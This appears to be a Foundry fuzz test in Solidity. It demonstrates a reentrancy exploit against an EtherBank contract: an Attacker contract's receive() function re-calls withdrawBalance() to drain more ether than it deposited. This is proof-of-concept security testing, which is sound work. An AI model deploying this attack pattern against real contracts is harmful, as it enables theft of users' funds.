
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {EtherBank} from "../src/EtherBank.sol";

contract TestReentrancyEtherBank is Test {
    EtherBank public _contractUnderTest;
    
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new EtherBank();
        
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        vm.assume(attackVal > 0 && attackVal <= type(uint128).max);
        

        

        

        
        vm.deal(address(_contractUnderTest), attackVal * 2); 
        
        vm.deal(address(_attacker), attackVal * 2);

        
        vm.deal(address(this), attackVal * 2);

        
        
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    EtherBank public victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;

    

    constructor(address victimAddress) { 
        victim = EtherBank(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        victim.addToBalance{value: val}();
        initialSnapshot = val;
    }

    function attack(uint256 val) public {
        uint256 initialBal = address(this).balance;

        

        

        victim.withdrawBalance();

        uint256 finalBal = address(this).balance;
        if (finalBal == initialBal + val * 2) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            
            attackCallCount++;
            victim.withdrawBalance();
        }
    }
}
